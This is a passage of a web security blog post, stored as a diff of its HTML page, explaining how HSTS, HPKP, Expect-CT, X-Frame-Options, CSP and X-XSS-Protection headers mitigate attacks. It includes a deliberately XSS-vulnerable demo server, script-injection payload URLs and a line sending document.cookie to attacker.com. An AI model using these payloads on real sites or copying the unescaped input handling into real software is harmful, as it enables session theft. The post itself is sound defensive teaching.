@@ -1,0 +1,861 @@
+
+<!doctype html>
+<!-- BEGIN _layouts/default.html -->
+<html>
+	<head>
+		<meta charset="utf-8">
+		
+		<meta content="We can improve the security of our web apps by using a few, underestimated headers: let's check them out!" name="description">
+		<meta content="Alessandro Nadalin" name="author">
+		
+		<title>Secure your web application with these HTTP headers</title>
+		<meta name="google-site-verification" content="dSNHLHJFQzKASjN8qHJisk2XLkKqbF_ilGSj9bscwKs" />
+		<link href="/favicon.png" rel="icon">
+		<link href="/stylesheets/screen.css" rel="stylesheet">
+		<link href="/atom.xml" rel="alternate" title="Alessandro Nadalin" type="application/atom+xml">
+		<link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<link rel="stylesheet" type="text/css" href="/MyFontsWebfontsKit.css">
+
+		<meta name="twitter:card" content="summary" />
+		<meta name="twitter:creator" content="@_odino_" />
+		<meta property="og:url" content="https://odino.org/secure-your-web-application-with-these-http-headers/" />
+		<meta property="og:title" content="Secure your web application with these HTTP headers" />
+		<meta property="og:description" content="We can improve the security of our web apps by using a few, underestimated headers: let's check them out!" />
+		
+	</head>
+	<body>
+		<div class="wrap">
+			<header>
+				<div class="navi">
+					<ul>
+                        <li><a href="/"><i class="icon-home icon-large"></i> Home</a></li>
+                        <li><a href="/about"><i class="icon-user icon-large"></i> About</a></li>
+                        <li><a href="/conferences"><i class="icon-group icon-large"></i> Conferences</a></li>
+                        <li><a href="/archives"><i class="icon-briefcase icon-large"></i> Archives</a></li>
+                        <li><a href="/atom.xml"><i class="icon-rss icon-large"></i> RSS</a></li>
+					</ul>
+				</div>
+			</header>
+			<!-- BEGIN _layouts/post.html -->
+
+    <header>
+        <h1><a href="/secure-your-web-application-with-these-http-headers/">Secure your web application with these HTTP headers</a></h1>
+        <time>23 August 2018</time>
+        <!-- 
+        
+        
+        
+          <br />
+          <time>(note: this post was written 3 years ago and might be outdated)</time>
+         -->
+    </header>
+<div class="entry-content "><ol class="aseries">
+    <p>This post is part of the &#8221;<strong><a href="/categories/wasec/">WASEC: Web Application SECurity</a></strong>&#8221; series, which is a portion of the content of <a href="https://leanpub.com/wasec">WASEC</a>, an e-book on web application security I&#8217;ve written.</p>
+    <p>Here is a list of all the articles in this series:</p>
+    <li>
+        <a href="/web-security-demistified/">Web security demystified: WASEC</a>
+    </li>
+    <li>
+        <a href="/introduction-to-web-application-security/">Introduction</a>
+    </li>
+    <li>
+        <a href="/wasec-understanding-the-browser/">Understanding the browser</a>
+    </li>
+    <li>
+        <a href="/security-https-perspective/">Security at the HTTP level</a>
+    </li>
+    <li>
+        <a href="/secure-your-web-application-with-these-http-headers/">HTTP headers to secure your application</a>
+    </li>
+    <li>
+        <a href="/security-hardening-http-cookies/">Hardening HTTP cookies</a>
+    </li>
+    <li>
+        <a href="/wasec-web-application-security-what-to-do-when-dot-dot-dot/">Situationals</a>
+    </li>
+    </br>
+    <p>
+        If you&#8217;ve enjoyed the content of this article, consider buying the complete ebook on either the <a href="https://www.amazon.com/WASEC-Application-Everything-developer-application-ebook/dp/B081Z7SD48">Kindle store</a> or <a href="https://leanpub.com/wasec">Leanpub</a>.
+    </p>
+</ol>
+
+
+<p>As we&rsquo;ve seen, servers can send HTTP headers to provide the client additional metadata
+around the response: beside sending the content that the client requested, clients
+are then allowed to specify how a particular resource should be read, cached or
+secured.</p>
+
+<p>There&rsquo;s currently a very large spectrum of security-related headers that we should
+understand, as they have been implemented by browsers in order to make it harder
+for attackers to take advantage of vulnerabilities: the next paragraphs try to
+summarize each and every one of them by explaining how they&rsquo;re used, what kind of
+attacks they prevent and a bit of history behind each header.</p>
+
+<!-- more -->
+
+
+<h2>HSTS</h2>
+
+<p>Since late 2012, HTTPS-everywhere believers have found it easier to force a client
+to always use the secure version of the HTTP protocol, thanks to the <em>HTTP Strict
+Transport Security</em>: a very simple <code>Strict-Transport-Security: max-age=3600</code> will
+tell the browser that for the next hour (3600 seconds) it should not interact with
+the applications with insecure protocols.</p>
+
+<p>When a user tries to access an application secured by HSTS through HTTP, the browser
+will simply refuse to go ahead, automatically converting <code>http://</code> URLs to <code>https://</code>.</p>
+
+<p>You can test this locally with the code at <a href="https://github.com/odino/wasec/tree/master/hsts">github.com/odino/wasec/tree/master/hsts</a>.
+You will need to follow the instructions in the README (they involve installing a trusted SSL
+certificate for <code>localhost</code> on your machine, through the amazing <a href="https://github.com/FiloSottile/mkcert">mkcert</a> tool)
+and then try opening <code>https://localhost:7889</code>: there are 2 servers in this example,
+an HTTPS one listening on <code>7889</code>, and an HTTP one on port <code>7888</code>. When you access
+the HTTPS server, it will always try to redirect you to the HTTP version, which will work since there is no HSTS policy on the HTTPS server.
+If you instead add the <code>hsts=on</code> parameter in your URL, the browser will forcefully
+convert the link in the redirect to its <code>https://</code> version. Since the server at <code>7888</code>
+is http-only, you will end staring at a page that looks more or less like this:</p>
+
+<p><img class="center" src="/images/wasec/hsts-no.png"></p>
+
+<p>You might be wondering what happens the first time a user visits your website, as
+there is no HSTS policy defined beforehand: attackers could potentially trick
+the user to the <code>http://</code> version of your website and perpetrate their attack there,
+so there&rsquo;s still room for problems. That&rsquo;s a valid concern, as HSTS is a
+<em>trust on first use</em> mechanism: what it tries to do is to make sure that,
+once you&rsquo;ve visited a website, the browser knows that subsequent interaction must
+use HTTPS.</p>
+
+<p>A way around this shortcoming would be to maintain a huge database of websites that enforce HSTS,
+something that Chrome does through <a href="https://hstspreload.org/">hstspreload.org</a>:
+you must first set your policy, then visit the website and check whether it&rsquo;s
+eligible to be added to the database. For example, we can see Facebook made the
+list:</p>
+
+<p><img class="center" src="/images/wasec/hsts-preload-fb.png"></p>
+
+<p>By submitting your website on this list, you can tell browsers in advance that your
+site uses HSTS, so that even the first interaction between clients and your server
+will be over a secure channel &mdash; but this comes at a cost: you really need to commit
+to HSTS. If, by any chance, you&rsquo;d like your website to be removed from the list
+that&rsquo;s no easy task for browser vendors:</p>
+
+<blockquote><p><em>Be aware that inclusion in the preload list cannot easily be undone.</em></p>
+
+<p><em>Domains can be removed, but it takes months for a change to reach users with
+a Chrome update and we cannot make guarantees about other browsers. Don&rsquo;t request
+inclusion unless you&rsquo;re sure that you can support HTTPS for your entire site
+and all its subdomains the long term.</em></p>
+
+<p><a href="https://hstspreload.org/">https://hstspreload.org/</a></p></blockquote>
+
+<p>This happens because the vendor cannot guarantee that all users will be on the
+latest version of their browser, with your site removed from the list. Think
+carefully, and make a decision based on your degree of confidence in HSTS and your
+ability to support it on the long run.</p>
+
+<h2>HPKP</h2>
+
+<p>HTTP Public Key Pinning (abbr. HPKP) is a mechanism that allows us to advertise to
+the browser which SSL certificates to expect whenever it connects to our servers:
+it is a <em>trust on first use</em> header, just like HSTS, meaning that, once the client
+connects to our server, it will store the certificate&rsquo;s info for subsequent interactions.
+If, at any point in time, the client detects that another certificate is being used by
+the server, it will politely refuse to connect, rendering <em>man in the middle</em> (MITM)
+attacks very hard to pull off.</p>
+
+<p>This is how a HPKP policy looks like:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Public-Key-Pins:
+</span><span class='line'>  pin-sha256="9yw7rfw9f4hu9eho4fhh4uifh4ifhiu=";
+</span><span class='line'>  pin-sha256="cwi87y89f4fh4fihi9fhi4hvhuh3du3=";
+</span><span class='line'>  max-age=3600; includeSubDomains;
+</span><span class='line'>  report-uri="https://pkpviolations.example.org/collect"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The header advertises what certificates the server will use (in this case it&rsquo;s two of them)
+using a hash of the certificates, and includes additional information such as
+the time-to-live of this directive (<code>max-age=3600</code>), and a few other details. Sadly,
+there&rsquo;s no point in digging deeper to understand what we can do with public key pinning,
+as <a href="https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/he9tr7p3rZ8/eNMwKPmUBAAJ">this feature is being deprecated by Chrome</a> &mdash; a signal that its adoption is
+destined to plummet very soon.</p>
+
+<p>Chrome&rsquo;s decision is not irrational, but simply a consequence of the risks
+associated with public key pinning: if you lose your certificate, or simply make a mistake
+while testing, your website is gone (for the duration of the <code>max-age</code> directive,
+which is typically weeks or months). As a result of these potentially catastrophic
+consequences, adoption of HPKP has been extremely low, and there have been incidents
+where <a href="https://www.smashingmagazine.com/be-afraid-of-public-key-pinning/">big-time websites have been unavailable</a> because of a misconfiguration. All considered,
+Chrome decided users were better off without the protection offered by HPKP &mdash; and
+<a href="https://scotthelme.co.uk/im-giving-up-on-hpkp/">security researchers aren&rsquo;t entirely against this decision</a>.</p>
+
+<h2>Expect-CT</h2>
+
+<p>While HPKP has been deprecated, a new header stepped in to prevent fraudulent
+SSL certificates from being served to clients: <code>Expect-CT</code>.</p>
+
+<p>The goal of this header is to inform the browser that it should perform additional
+&ldquo;background checks&rdquo; to ensure the certificate is genuine: when a server uses
+the <code>Expect-CT</code> header, it is fundamentally requesting the client to verify that
+the certificates being used are present in public Certificate Transparency (CT)
+logs.</p>
+
+<p>The Certificate Transparency initiative is an effort led by Google in order to:</p>
+
+<blockquote><p><em>[provide] an open framework for monitoring and auditing SSL certificates in nearly real time.</em></p>
+
+<p><em>Specifically, Certificate Transparency makes it possible to detect SSL certificates
+that have been mistakenly issued by a certificate authority or maliciously acquired
+from an otherwise unimpeachable certificate authority. It also makes it possible
+to identify certificate authorities that have gone rogue and are maliciously
+issuing certificates.</em></p>
+
+<p><a href="https://www.certificate-transparency.org/">https://www.certificate-transparency.org/</a></p></blockquote>
+
+<p>The header takes this form:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Expect-CT: max-age=3600, enforce, report-uri="https://ct.example.com/report"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In this example, the server is asking the browser to:</p>
+
+<ul>
+<li>enable CT verification for the current app for a period of 1 hour (3600 seconds)</li>
+<li><code>enforce</code> this policy and prevent access to the app if a violation occurs</li>
+<li>send a report to the given URL if a violation occurs</li>
+</ul>
+
+
+<p>The Certificate Transparency initiative&rsquo;s goal is to detect misissued or malicious
+certificates (and rogue Certificate Authorities) earlier, faster, and more precisely
+than any other method used before. By opting-in using the <code>Expect-CT</code> header,
+you can take advantage of this initiative to improve your app&rsquo;s security posture.</p>
+
+<h2>X-Frame-Options</h2>
+
+<p>Imagine seeing a web page such as this popping in front of your screen:</p>
+
+<p><img class="center" src="/images/wasec/win-hummer.png"></p>
+
+<p>As soon as you click on the link, you realize that all the money in your bank
+account is gone. What happened?</p>
+
+<p>You were a victim of a <em>clickjacking</em> attack: an attacker directed you to their
+website, which displays a very attractive link to click. Unfortunately, he also
+embedded in the page an iframe from <code>your-bank.com/transfer?amount=-1&amp;to=attacker@example.com</code>
+but hid it by setting it&rsquo;s opacity to 0%: what then happened is that thought of
+clicking on the original page, trying to win a brand-new hummer, but instead the
+browser captured a click on the iframe &mdash; a dangerous click that confirmed the transfer
+of money. Most banking systems require you to specify a one-time PIN code to confirm
+transactions, but your bank didn&rsquo;t catch up with times and all of your money is gone.</p>
+
+<p>The example is pretty extreme but should let you understand what could be the
+consequences of a <a href="https://www.troyhunt.com/clickjack-attack-hidden-threat-right-in/">clickjacking attack</a>: the user intends to click on a particular link,
+while the browser will trigger a click on the &ldquo;invisible&rdquo; page that&rsquo;s been embedded
+as an iframe.</p>
+
+<p>I have included an example of this vulnerability at <a href="https://github.com/odino/wasec/tree/master/clickjacking">github.com/odino/wasec/tree/master/clickjacking</a>.
+If you run the example and try clicking on the &ldquo;appealing&rdquo; link, you will see the
+actual click is intercepted by the iframe, which increases its opacity so that&rsquo;s
+easier for you to spot the problem. The example should be accessible at
+<code>http://localhost:7888</code>:</p>
+
+<p><img class="center" src="/images/wasec/hummer-clicked.png"></p>
+
+<p>Luckily, browsers have come up with a simple solution to the problem: <code>X-Frame-Options</code>
+(abbr. XFO) lets you decide whether your app
+can be embedded as an iframe on external websites. Popularized by Internet Explorer
+8, XFO was first introduced in 2009 and is still supported by all major browsers:
+when a browser sees an iframe, it loads it and verifies that its XFO allows its inclusion
+in the current page before rendering it.</p>
+
+<p><img class="center" src="/images/wasec/xfo-browser.png"></p>
+
+<p>The supported values are:</p>
+
+<ul>
+<li><code>DENY</code>: this web page cannot be embedded anywhere. This is the highest level of protection
+as it doesn&rsquo;t allow anyone to embed our content</li>
+<li><code>SAMEORIGIN</code>: only pages from the same domain as the current one can embed this page.
+This means that <code>example.com/embedder</code> can load <code>example.com/embedded</code> so long as
+its policy is set to <code>SAMEORIGIN</code>. This is a more relaxed policy that allows owners
+of a particular website to embed their own pages across their application</li>
+<li><code>ALLOW-FROM uri</code>: embedding is allowed from the specified URI. We could, for example,
+let an external, authorized website embed our content by using <code>ALLOW-FROM https://external.com</code>.
+This is generally used when you intend to allow a 3rd party to embed your content
+through an iframe</li>
+</ul>
+
+
+<p>An example HTTP response that includes the strictest XFO policy possible looks like:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>HTTP/1.1 200 OK
+</span><span class='line'>Content-Type: application/json
+</span><span class='line'>X-Frame-Options: DENY
+</span><span class='line'>
+</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In order to showcase how browsers behave when XFO is enabled, we can simply change
+the URL of our example to <code>http://localhost:7888/?xfo=on</code>. The <code>xfo=on</code> parameter
+tells the server to include <code>X-Frame-Options: deny</code> in the response, and we can
+see how the browser restricts access to the iframe:</p>
+
+<p><img class="center" src="/images/wasec/hummer-xfo.png"></p>
+
+<p>XFO has been considered the best way to prevent frame-based clickjacking attacks
+until another header came into play years later: the Content Security Policy.</p>
+
+<h2>Content-Security-Policy</h2>
+
+<p>The <code>Content-Security-Policy</code> header, often abbreviated to CSP, provides a next-generation
+utility belt for preventing a plethora of attacks, ranging from XSS (cross-site scripting)
+to clickjacking.</p>
+
+<p>To understand how CSP helps us, we should first think of an attack vector: let&rsquo;s
+say we just built our own Google Search, a simple input text with a submit button.</p>
+
+<p><img class="center" src="/images/wasec/own-google-xss.png"></p>
+
+<p>This web application does nothing magical: displays a form, lets the user
+execute a search and displays the search results alongside with the keyword the
+user searched for. When we execute a simple search, this is what the application
+returns:</p>
+
+<p><img class="center" src="/images/wasec/xss-lovely-kitten.png"></p>
+
+<p>Amazing: our application incredibly understood our search and found a related image.
+If we dig deeper in the source code, available at <a href="https://github.com/odino/wasec/tree/master/xss">github.com/odino/wasec/tree/master/xss</a>,
+we will soon realize that the application presents a security issue, as whatever
+keyword the user searches for is directly printed in the HTML served to the client:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kd">var</span> <span class="nx">qs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;querystring&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="p">).</span><span class="nx">createServer</span><span class="p">((</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span><span class='line'>  <span class="kd">let</span> <span class="nx">query</span> <span class="o">=</span> <span class="nx">qs</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">url</span><span class="p">).</span><span class="nx">query</span><span class="p">)</span>
+</span><span class='line'>  <span class="kd">let</span> <span class="nx">keyword</span> <span class="o">=</span> <span class="nx">query</span><span class="p">.</span><span class="nx">search</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span>
+</span><span class='line'>  <span class="kd">let</span> <span class="nx">results</span> <span class="o">=</span> <span class="nx">keyword</span> <span class="o">?</span> <span class="err">`</span><span class="nx">You</span> <span class="nx">searched</span> <span class="k">for</span> <span class="s2">&quot;${keyword}&quot;</span><span class="p">,</span> <span class="nx">we</span> <span class="nx">found</span><span class="o">:&lt;</span><span class="sr">/br&gt;&lt;img src=&quot;http:/</span><span class="o">/</span><span class="nx">placekitten</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="mi">200</span><span class="o">/</span><span class="mi">300</span><span class="err">&quot;</span> <span class="o">/&gt;</span><span class="err">`</span> <span class="o">:</span> <span class="err">`</span><span class="nx">Try</span> <span class="nx">searching</span><span class="p">...</span><span class="err">`</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">__dirname</span> <span class="o">+</span> <span class="s1">&#39;/index.html&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">().</span><span class="nx">replace</span><span class="p">(</span><span class="s1">&#39;__KEYWORD__&#39;</span><span class="p">,</span> <span class="nx">keyword</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="s1">&#39;__RESULTS__&#39;</span><span class="p">,</span> <span class="nx">results</span><span class="p">))</span>
+</span><span class='line'><span class="p">}).</span><span class="nx">listen</span><span class="p">(</span><span class="mi">7888</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;html&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;body&gt;</span>
+</span><span class='line'>    <span class="nt">&lt;h1&gt;</span>Search The Web<span class="nt">&lt;/h1&gt;</span>
+</span><span class='line'>    <span class="nt">&lt;form&gt;</span>
+</span><span class='line'>      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;search&quot;</span> <span class="na">value=</span><span class="s">&quot;__KEYWORD__&quot;</span> <span class="nt">/&gt;</span>
+</span><span class='line'>      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="nt">/&gt;</span>
+</span><span class='line'>    <span class="nt">&lt;/form&gt;</span>
+</span><span class='line'>    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">&quot;results&quot;</span><span class="nt">&gt;</span>
+</span><span class='line'>      __RESULTS__
+</span><span class='line'>    <span class="nt">&lt;/div&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;/body&gt;</span>
+</span><span class='line'><span class="nt">&lt;/html&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This presents a nasty consequence: an attacker can craft a specific link that
+executed arbitrary JavaScript on the victim&rsquo;s browser!</p>
+
+<p><img class="center" src="/images/wasec/xss-pwned.png"></p>
+
+<p>If you have the time and patience to run the example locally, you will be able
+to quickly understand the power of CSP. I&rsquo;ve added a query string parameter that
+turns CSP on, so we can try navigating to a malicious URL with CSP turned on:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>http://localhost:7888/?search=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%28%27You%20have%20been%20PWNED%27%29%3C%2Fscript%3E<span class="err">&amp;</span>csp=on
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="center" src="/images/wasec/xss-mitigated.png"></p>
+
+<p>As you see in the example above, we have told the browser that our CSP policy only
+allows scripts included from the same origin of the current URL, which we can easily
+verify by curling the URL:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>$ curl -I &quot;http://localhost:7888/?search=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%28%27You%20have%20been%20PWNED%27%29%3C%2Fscript%3E<span class="err">&amp;</span>csp=on&quot;
+</span><span class='line'>
+</span><span class='line'>HTTP/1.1 200 OK
+</span><span class='line'>X-XSS-Protection: 0
+</span><span class='line'>Content-Security-Policy: default-src &#39;self&#39;
+</span><span class='line'>Date: Sat, 11 Aug 2018 10:46:27 GMT
+</span><span class='line'>Connection: keep-alive
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since the XSS attack would be perpetrated through an <em>inline script</em> (a script
+directly embedded in the HTML content), the browser politely refused to execute it,
+keeping our user safe. Imagine if, instead of simply displaying an alert dialog,
+the attacker would have set up a redirect to its own domain, through some JavaScript
+code that could look like:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="err">`</span><span class="nx">attacker</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">$</span><span class="p">{</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">}</span><span class="err">`</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>They would have been able to steal all of the user&rsquo;s cookies, which might contain
+highly sensitive data (more on this in the next article).</p>
+
+<p>By now, it should be clear how CSP helps us prevent a range of attacks on web applications:
+you define a policy and the browser will strictly adhere to it, refusing to run
+resources that would violate the policy.</p>
+
+<p>An interesting variation of CSP is the <em>report-only</em> mode: instead of using the
+<code>Content-Security-Policy</code> header, you can first test the impact of CSP on your
+website by telling the browser to simply report errors, without blocking script
+execution and so on, by using the <code>Content-Security-Policy-Report-Only</code> header.</p>
+
+<p>Reporting will allow you to understand what breaking changes the CSP policy you&rsquo;d
+like to roll out might cause, and fix them accordingly &mdash; we can even specify
+a report URL and the browser will send us a report. Here&rsquo;s a full example of a
+report-only policy:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">Content</span><span class="o">-</span><span class="nx">Security</span><span class="o">-</span><span class="nx">Policy</span><span class="o">:</span> <span class="k">default</span><span class="o">-</span><span class="nx">src</span> <span class="s1">&#39;self&#39;</span><span class="p">;</span> <span class="nx">report</span><span class="o">-</span><span class="nx">uri</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//cspviolations.example.com/collector</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>CSP policies can be a bit complex on their own, such as in the following example:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">Content</span><span class="o">-</span><span class="nx">Security</span><span class="o">-</span><span class="nx">Policy</span><span class="o">:</span> <span class="k">default</span><span class="o">-</span><span class="nx">src</span> <span class="s1">&#39;self&#39;</span><span class="p">;</span> <span class="nx">script</span><span class="o">-</span><span class="nx">src</span> <span class="nx">scripts</span><span class="p">.</span><span class="nx">example</span><span class="p">.</span><span class="nx">com</span><span class="p">;</span> <span class="nx">img</span><span class="o">-</span><span class="nx">src</span> <span class="o">*</span><span class="p">;</span> <span class="nx">media</span><span class="o">-</span><span class="nx">src</span> <span class="nx">medias</span><span class="p">.</span><span class="nx">example</span><span class="p">.</span><span class="nx">com</span> <span class="nx">medias</span><span class="p">.</span><span class="nx">legacy</span><span class="p">.</span><span class="nx">example</span><span class="p">.</span><span class="nx">com</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This policy defines the following rules:</p>
+
+<ul>
+<li>executable scripts (eg. JavaScript) can only be loaded from <code>scripts.example.com</code></li>
+<li>images may be loaded from any origin (<code>img-src: *</code>)</li>
+<li>video or audio content can be loaded from two origins: <code>medias.example.com</code> and <code>medias.legacy.example.com</code></li>
+</ul>
+
+
+<p>As you can see, policies can become lengthy, and if we want to
+ensure the highest protection for our users this can become quite of a tedious process;
+nevertheless, writing a comprehensive CSP policy is an important step towards adding
+an additional layer of security to our web applications.</p>
+
+<p>For more information around CSP I would recommend a deep dive at <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a>.</p>
+
+<h2>X-XSS-Protection</h2>
+
+<p>Although superseded by CSP, the <code>X-XSS-Protection</code> header provides a similar type
+of protection: unsupported by Firefox, this header is used to
+mitigate XSS attacks in older browsers that don&rsquo;t fully support CSP.</p>
+
+<p>Its syntax is very similar to what we&rsquo;ve just seen:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">X</span><span class="o">-</span><span class="nx">XSS</span><span class="o">-</span><span class="nx">Protection</span><span class="o">:</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">report</span><span class="o">=</span><span class="nx">http</span><span class="o">:</span><span class="c1">//xssviolations.example.com/collector</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Reflected XSS is the most common type of attack, where an unsanitized input gets
+printed by the server without any validation, and it&rsquo;s where this header truly
+shines. If you want to see this yourself, I would recommend to try out the example
+at <a href="https://github.com/odino/wasec/tree/master/xss">github.com/odino/wasec/tree/master/xss</a>
+as, by appending <code>xss=on</code> to the URL, it shows what a browser does when XSS protection
+is turned on. If we enter a malicious string in our search box, such as
+<code>&lt;script&gt;alert('hello')&lt;/script&gt;</code>, the browser will politely refuse to execute the
+script, and explain the reasoning behind its decision:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">The</span> <span class="nx">XSS</span> <span class="nx">Auditor</span> <span class="nx">refused</span> <span class="nx">to</span> <span class="nx">execute</span> <span class="nx">a</span> <span class="nx">script</span> <span class="k">in</span>
+</span><span class='line'><span class="s1">&#39;http://localhost:7888/?search=%3Cscript%3Ealert%28%27hello%27%29%3C%2Fscript%3E&amp;xss=on&#39;</span>
+</span><span class='line'><span class="nx">because</span> <span class="nx">its</span> <span class="nx">source</span> <span class="nx">code</span> <span class="nx">was</span> <span class="nx">found</span> <span class="nx">within</span> <span class="nx">the</span> <span class="nx">request</span><span class="p">.</span>
+</span><span class='line'><span class="nx">The</span> <span class="nx">server</span> <span class="nx">sent</span> <span class="nx">an</span> <span class="s1">&#39;X-XSS-Protection&#39;</span> <span class="nx">header</span> <span class="nx">requesting</span> <span class="k">this</span> <span class="nx">behavior</span><span class="p">.</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Even more interesting is Chrome&rsquo;s default behavior when the webpage does not specify
+any CSP or XSS policy, a scenario we can test by adding the <code>xss=off</code> parameter
+to our URL (<code>http://localhost:7888/?search=%3Cscript%3Ealert%28%27hello%27%29%3C%2Fscript%3E&amp;xss=off</code>):</p>
+
+<p><img class="center" src="/images/wasec/xss-auditor.png"></p>
+
+<p>Amazing, Chrome&rsquo;s cautious enough that it will prevent the page from rendering,
+making reflected XSS very difficult to pull off &mdash; it&rsquo;s impressive to see how far
+browsers have come.</p>
+
+<h2>Feature policy</h2>
+
+<p>In July 2018, security researches <a href="https://scotthelme.co.uk/">Scott Helme</a> published a very interesting <a href="https://scotthelme.co.uk/a-new-security-header-feature-policy/">blog
+post</a> detailing a new security header in the making: <code>Feature-Policy</code>.</p>
+
+<p>Currently supported by very few browsers (Chrome and Safari at the time of writing),
+this header lets us define whether a specific browser feature is enabled within
+the current page: with a syntax very similar to CSP, we should have no issue
+understanding what a feature policy such as the following one means:</p>
+
